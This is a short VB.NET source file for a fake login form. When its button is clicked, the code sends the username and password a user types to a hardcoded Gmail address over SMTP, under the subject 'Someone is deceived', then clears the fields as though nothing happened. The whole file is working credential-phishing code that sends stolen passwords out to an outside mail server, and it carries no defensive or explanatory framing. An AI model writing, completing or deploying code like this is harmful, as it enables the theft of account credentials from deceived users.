Imports System.Net.Mail
Imports System.Net
Public Class frmMain

    Private Sub btnLogin_Click(sender As Object, e As EventArgs) Handles btnLogin.Click
        'constructs object from mailMessage class
        Dim MyMailMessage As New MailMessage()

        Try
            'constructs a MailAddress object to store an email address to use
            Dim SendingAddress As MailAddress = New MailAddress("vbstockton@gmail.com")

            'stores a mailaddress object which conatins an email
            'indicates message will be sent
            MyMailMessage.From = SendingAddress
            'adds new email to mymailmessage
            MyMailMessage.To.Add("sample@gmail.com")
            'MyMailMessage.To.Add("")
            'sets the subject of the email
            MyMailMessage.Subject = "Someone is deceived"
            'sets the body of the email
            MyMailMessage.Body = "Username: " & txtUserName.Text & "  Password: " & txtPwd.Text

            Dim MySMTP As New SmtpClient("smtp.gmail.com")

            'stores port number used by local smtp server
            MySMTP.Port = 587
            'server uses SSL to encrypt message, so enable must be set to true
            MySMTP.EnableSsl = True

            Dim MyCrediential As NetworkCredential = New NetworkCredential("sample@gmail.com", "password")
            MySMTP.Credentials = MyCrediential
            MySMTP.Send(MyMailMessage)

            txtUserName.Text = ""
            txtPwd.Text = ""
            txtUserName.Select()
        Catch ex As Exception
            MessageBox.Show("Login fails", "Error")
        End Try
    End Sub

    Private Sub btnExit_Click(sender As Object, e As EventArgs) Handles btnExit.Click
        Me.Close()
    End Sub
End Class
